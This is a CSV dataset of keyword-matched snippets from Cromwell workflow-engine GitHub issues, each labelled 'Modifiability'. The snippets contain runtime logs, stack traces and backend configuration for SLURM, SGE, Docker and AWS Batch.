quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Modifiability,"ng with database db.url = jdbc:hsqldb:mem:a975ddc6-f298-4393-b1f0-e93250d3cca8;shutdown=false;hsqldb.tx=mvcc; [2018-10-25 21:21:07,82] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-10-25 21:21:07,84] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-10-25 21:21:07,95] [info] Running with database db.url = jdbc:hsqldb:mem:d98689d1-c87b-486c-aa55-626823fb3bb1;shutdown=false;hsqldb.tx=mvcc; [2018-10-25 21:21:08,32] [info] Slf4jLogger started; [2018-10-25 21:21:08,56] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-fcf9c1d"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-25 21:21:08,59] [info] Metadata summary refreshing every 2 seconds.; [2018-10-25 21:21:08,63] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:21:08,64] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-25 21:21:08,64] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:21:09,79] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-25 21:21:09,81] [info] SingleWorkflowRunnerActor: Version 34; [2018-10-25 21:21:09,82] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-25 21:21:09,86] [info] Unspecified type (Unspecified version) workflow 0bb77c74-4c5c-4314-8463-072e7055ee7c submitted; [2018-10-25 21:21:09,90] [info] SingleWorkflowRunnerActor: Workflow submitted 0bb77c74-4c5c-4314-8463-072e7055ee7c; [2018-10-25 21:21:09,91] [info] 1 new workflows fetched; [2018-10-25 21:21:09,91] [info] WorkflowManagerActor Starting workflow 0bb77c74-4c5c-4314-8463-072e7055ee7c; [2018-10-25 21:21:09,91] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-10-25 21:21:09,92] [warn] Couldn'",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4318:1701,config,configured,1701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4318,1,['config'],['configured']
Modifiability,"ng with database db.url = jdbc:hsqldb:mem:bb200ed8-7db5-49a0-a250-ca46b3332697;shutdown=false;hsqldb.tx=mvcc; [2018-10-25 21:17:12,03] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-10-25 21:17:12,04] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-10-25 21:17:12,13] [info] Running with database db.url = jdbc:hsqldb:mem:c7a7ec22-dec6-4fae-a53b-6c9933402fa9;shutdown=false;hsqldb.tx=mvcc; [2018-10-25 21:17:12,59] [info] Slf4jLogger started; [2018-10-25 21:17:12,88] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-f5ccf1c"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-25 21:17:12,90] [info] Metadata summary refreshing every 2 seconds.; [2018-10-25 21:17:12,98] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:17:12,98] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-25 21:17:12,98] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:17:13,79] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-25 21:17:13,80] [info] SingleWorkflowRunnerActor: Version 36; [2018-10-25 21:17:13,81] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-25 21:17:13,84] [info] Unspecified type (Unspecified version) workflow e22c6324-5aec-4694-8750-f62160e2ca81 submitted; [2018-10-25 21:17:13,85] [info] SingleWorkflowRunnerActor: Workflow submitted e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,85] [info] 1 new workflows fetched; [2018-10-25 21:17:13,85] [info] WorkflowManagerActor Starting workflow e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,86] [info] WorkflowManagerActor Successfully started WorkflowActor-e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,86] [info] ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4318:10721,config,configured,10721,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4318,1,['config'],['configured']
Modifiability,"ng with database db.url = jdbc:hsqldb:mem:bc9ad7e3-efc7-4f37-aecb-b283b104cbcd;shutdown=false;hsqldb.tx=mvcc; [2023-02-04 08:55:06,54] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2023-02-04 08:55:06,55] [info] [RenameWorkflowOptionsInMetadata] 100%; [2023-02-04 08:55:06,64] [info] Running with database db.url = jdbc:hsqldb:mem:a487ea75-b617-4523-a254-d0e694e68ff9;shutdown=false;hsqldb.tx=mvcc; [2023-02-04 08:55:06,92] [info] Slf4jLogger started; [2023-02-04 08:55:07,18] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-b625dba"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2023-02-04 08:55:07,22] [info] Metadata summary refreshing every 2 seconds.; [2023-02-04 08:55:07,26] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2023-02-04 08:55:07,26] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2023-02-04 08:55:07,26] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2023-02-04 08:55:07,63] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2023-02-04 08:55:07,64] [info] SingleWorkflowRunnerActor: Version 34-unknown-SNAP; [2023-02-04 08:55:07,65] [info] SingleWorkflowRunnerActor: Submitting workflow; [2023-02-04 08:55:07,68] [info] Unspecified type (Unspecified version) workflow 48f62f22-25fe-4f0f-b5fe-21191f035abd submitted; [2023-02-04 08:55:07,72] [info] SingleWorkflowRunnerActor: Workflow submitted [38;5;2m48f62f22-25fe-4f0f-b5fe-21191f035abd[0m; [2023-02-04 08:55:07,75] [info] 1 new workflows fetched; [2023-02-04 08:55:07,75] [info] WorkflowManagerActor Starting workflow [38;5;2m48f62f22-25fe-4f0f-b5fe-21191f035abd[0m; [2023-02-04 08:55:07,76] [[38;5;220mwarn[0m] SingleWorkflowRunnerActor: received unexpected message: Done in state R",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:1387,config,configured,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['config'],['configured']
Modifiability,ngType) pbs_email; 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclaration(DeclarationValidation.scala:41); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$$anonfun$fromDeclarations$1.apply(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$$anonfun$fromDeclarations$1.apply(DeclarationValidation.scala:17); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:1937,config,config,1937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['config'],['config']
Modifiability,"nge https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; This is a remark on https://github.com/broadinstitute/cromwell/blob/master/docs/tutorials/HPCSlurmWithLocalScratch.md there is a feature on slum config to edit the sbatch command. You could add in a find and replace in the config to do the same as the tutorial. you can skip the first part of the tutorial by editing the slurm backend config (somewhat hotpatching the scripts on submission time). old submit ; submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for slurm auto configured job dir: ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""\$TMPDIR""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for /genomics/local/ (not tested tough): ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""$(mkdir -p ""\/genomics_local\/\$PID_\$HOSTNAME""\/"" && echo ""\/genomics_local\/\$PID_\$HOSTNAME""\/""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; <!-- This is a clear feature cant you see -->. <!-- Which backend are you running? -->; The backend I'm running on is Slurm hpc with a version 1.0 workflow. This alternative workflow has its downsides but also benefits it is up to the hpc(user) to decide what works best in their own situation. ; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7357:2109,config,configuration,2109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7357,1,['config'],['configuration']
Modifiability,"ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:5074,Config,ConfigHashingStrategy,5074,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['Config'],['ConfigHashingStrategy']
Modifiability,"nknown Source); 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43); 	at java.lang.reflect.Method.invoke(Method.java:498); 	at wdl4s.wdl.expression.WdlFunctions.$anonfun$getFunction$1(WdlFunctions.scala:11); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:190); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:56); 	at wdl4s.wdl.WdlExpression$.evaluate(WdlExpression.scala:91); 	at wdl4s.wdl.WdlExpression.evaluate(WdlExpression.scala:172); 	at wdl4s.wdl.WdlTask.$anonfun$evaluateOutputs$2(WdlTask.scala:188); 	... 34 more; Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1065); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.get(HttpStorageRpc.java:333); 	... 80 more; ```. If this was due to an extended GCS service outage, a workflow failure is expected. But if cromwell didn't retry at all after a single cloud hiccup, that should be fixed as cloud hiccups are expected.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:8878,extend,extended,8878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['extend'],['extended']
Modifiability,"nloads sifs only one at a time; apptainer sif db doesn't handle concurrency well; out=$(flock --exclusive --timeout 1800 $LOCK_FILE apptainer pull $IMAGE docker://${docker} 2>&1); ret=$?; if [[ $ret == 0 ]]; then; echo ""Successfully pulled ${docker}!""; else; if [[ $(echo $out | grep ""exists"" ) ]]; then; echo ""Image file already exists, ${docker}!""; else; echo ""Failed to pull ${docker}"" >> /dev/stderr; exit $ret; fi; fi; #full path to sif for qsub command; IMAGE=""$APPTAINER_PULLFOLDER/$IMAGE""; qsub \; -terse \; -V \; -b y \; -N ""${job_name}"" \; -wd ""${cwd}"" \; -o ""${out}.qsub"" \; -e ""${err}.qsub"" \; -pe smp ""${cpu}"" \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; apptainer exec --cleanenv --bind ""${cwd}:${docker_cwd},<path>"" ""$IMAGE"" ""${job_shell}"" ""${docker_script}""; """""". default-runtime-attributes; {; failOnStderr: false; continueOnReturnCode: 0; }; }; }. sge_docker {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ""docker exec -v ${cwd}:${docker_cwd} -v <path> ${job_shell} ${docker_script}""; """""". default-runtime-attributes; {; failOnStderr: false; continueOnReturnCode: 0; }; }; } ; }; Local; {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLif",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:4712,Config,ConfigBackendLifecycleActorFactory,4712,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"not run program ""ps"": /[...]/cromwell-executions/wf_name/994bc7a0-2340-4903-9feb-af685f3197d0/call-task1/execution/stdout.check (No such file or directory); java.io.IOException: Cannot run program ""ps"": /[...]/cromwell-executions/wf_name/994bc7a0-2340-4903-9feb-af685f3197d0/call-task1/execution/stdout.check (No such file or directory); 	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048); 	at cromwell.backend.sfs.ProcessRunner.run(ProcessRunner.scala:20); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$isAlive$1(SharedFileSystemAsyncJobExecutionActor.scala:196); 	at scala.runtime.java8.JFunction0$mcZ$sp.apply(JFunction0$mcZ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1198,config,config,1198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['config'],['config']
Modifiability,"nputs\"": [\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Optional - location of the GRIDSS assembly BAM. This file will be created by GRIDSS.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--assembly\""\n },\n \""default\"": \"".assembly.bam\"",\n \""id\"": \""#gridss-2.9.4.cwl/assembly\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional - BED file containing regions to ignore\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--blacklist\""\n },\n \""id\"": \""#gridss-2.9.4.cwl/blacklist\""\n },\n {\n \""type\"": \""string\"",\n \""doc\"": \""portion of 6 sigma read pairs distribution considered concordantly mapped. Default: 0.995\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--concordantreadpairdistribution\""\n },\n \""default\"": \""0.995\"",\n \""id\"": \""#gridss-2.9.4.cwl/concordantreadpairdistribution\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional - configuration file use to override default GRIDSS settings.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--configuration\""\n },\n \""id\"": \""#gridss-2.9.4.cwl/configuration\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - use the system version of bwa instead of the in-process version packaged with GRIDSS\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--externalaligner\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/externalaligner\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Optional - location of GRIDSS jar\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jar\""\n },\n \""default\"": \""/opt/gridss/gridss-2.9.4-gridss-jar-with-dependencies.jar\"",\n \""id\"": \""#gridss-2.9.4.cwl/jar\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""zero-based assembly job index (only required when performing parallel assembly across multiple computers)\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jobindex\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/jobindex\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""total number of assembly jobs (on",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:73552,config,configuration,73552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['config'],['configuration']
Modifiability,"ns to the following groups: 41d3eecf: 1; [2019-07-10 14:33:01,22] [warn] Localization via hard link has failed: /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/cromwell-executions/scMeth/41d3eecf-c5a9-42e4-8a29-8be9c252b7f5/call-trimAdapters/inputs/13016223/fastq -> /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/fastq; [2019-07-10 14:33:01,23] [warn] Localization via copy has failed: /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/fastq; [2019-07-10 14:33:01,24] [error] BackgroundConfigAsyncJobExecutionActor [41d3eecfscMeth.trimAdapters:NA:1]: Error attempting to Execute; java.lang.Exception: Failed command instantiation; 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:576); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:511); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:319); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:318); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$B",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:9883,config,config,9883,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['config'],['config']
Modifiability,"ns:/cromwell-working-dir/cromwell-executions; - /data1:/data1; command: [""/wait-for-it/wait-for-it.sh mysql-db:3306 -t 120 -- java -Dconfig.file=/app-config/cromwell-application.conf -jar /app/cromwell.jar server""]; links:; - mysql-db; ports:; - ""80:8000""; mysql-db:; image: ""mysql:5.7""; environment:; - MYSQL_ROOT_PASSWORD=cromwell; - MYSQL_DATABASE=cromwell_db; volumes:; - ./compose/mysql/init:/docker-entrypoint-initdb.d; - ./compose/mysql/data:/var/lib/mysql; ports:; - ""3307:3306""; ```. and here is my crowell config file:. ```include required(classpath(""application"")). # Note: If you spot a mistake in this configuration sample, please let us know by making an issue at:; # https://github.com/broadinstitute/cromwell/issues. call-caching {; enabled = false; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:1121,Config,ConfigBackendLifecycleActorFactory,1121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"nstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; `s3.caching.duplication-strategy` doesn't work on AWSBatch backend. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->; https://broadworkbench.atlassian.net/browse/CROM-6734. <!-- Which backend are you running? -->; AWSBatch. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. ```; include required(classpath(""application"")). backend {; default = ""aws""; providers {; aws {; config {; default-runtime-attributes {; scriptBucketName = ""caper4-04-20-2021""; queueArn = ""arn:aws:batch:us-east-1:618537831167:job-queue/default-caper5""; }; filesystems {; s3 {; caching {; duplication-strategy = ""reference""; }; auth = ""default""; }; }; concurrent-job-limit = 1000; numSubmitAttempts = 6; numCreateDefinitionAttempts = 6; auth = ""default""; root = ""s3://caper4-04-20-2021/out""; }; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; }; }; }. system {; job-rate-control {; jobs = 1; per = ""2 seconds""; }; abort-jobs-on-terminate = true; graceful-server-shutdown = true; max-concurrent-workflows = 40; }; call-caching {; invalidate-bad-cache-results = true; enabled = true; }; database {; db {; connectionTimeout = 30000; numThreads = 1; url = ""jdbc:hsqldb:file:/opt/caper/default_file_db;shutdown=false;hsqldb.tx=mvcc;hsqldb.lob_compressed=true;hsqldb.default_table_type=cached;hsqldb.result_max_memory_rows=10000;hsqldb.large_data=true;hsqldb.applog=1;hsqldb.script_format=3""; }; }; aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3 {; auth 